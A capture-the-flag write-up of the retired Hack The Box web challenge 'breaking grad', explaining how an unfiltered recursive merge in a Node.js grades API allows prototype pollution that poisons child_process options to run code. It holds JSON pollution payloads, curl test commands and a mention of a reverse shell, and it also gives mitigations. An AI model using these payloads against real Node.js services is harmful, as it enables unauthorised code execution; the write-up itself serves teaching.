---
challenge: breaking grad
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, nodejs, prototype-pollution, rce]
---

# breaking grad — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Solved challenge; no real flags.

## TL;DR

A Node.js grading API. A recursive `merge` that does not filter keys leaves **prototype pollution**; poisoning `Object.prototype` changes how a `child_process` call runs and executes code.

## Brief

A "grades" app with endpoints to create students and compute averages. Source code ships with the challenge.

## Analysis

The merge does not drop `__proto__` or `constructor`:

```js
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object') merge(target[key], source[key]);
    else target[key] = source[key];
  }
}
```

Any endpoint accepting nested JSON allows:

```json
{"__proto__": {"polluted": "yes"}}
```

Check:

```bash
curl -s -X POST http://<IP>:<port>/api/students -H 'Content-Type: application/json' \
  -d '{"name":"x","__proto__":{"polluted":"yes"}}'
curl -s http://<IP>:<port>/api/students | grep polluted
```

## Exploitation

Execution arrives through a `child_process` call whose options are read from a shared object (`shell`, `NODE_OPTIONS` or `env`):

```json
{"__proto__": {"shell": "/proc/self/exe", "NODE_OPTIONS": "--require /proc/self/cmdline"}}
```

Or with `env` injecting a startup shell:

```json
{"__proto__": {"env": {"EVIL": "1"}, "shell": "/bin/sh", "argv0": "sh"}}
```

Triggering the calculation makes the child inherit the poisoned object and run the payload. Use it to read `/flag*` or spawn a reverse shell.

## Pitfalls

- **The merge must be recursive**: `Object.assign` does not pollute.
- **`__proto__` blocked**: try `constructor.prototype`.
- **In-process state**: if Node restarts per request the effect is lost; this box keeps the server alive.

## Lessons

- Prototype pollution in Node is RCE when a child process reads options from shared objects.
- `for...in` without `hasOwnProperty` is the root cause.
- Mitigation: `Object.create(null)`, `Map`, patched `lodash.merge`, and schema validation with `additionalProperties: false`.
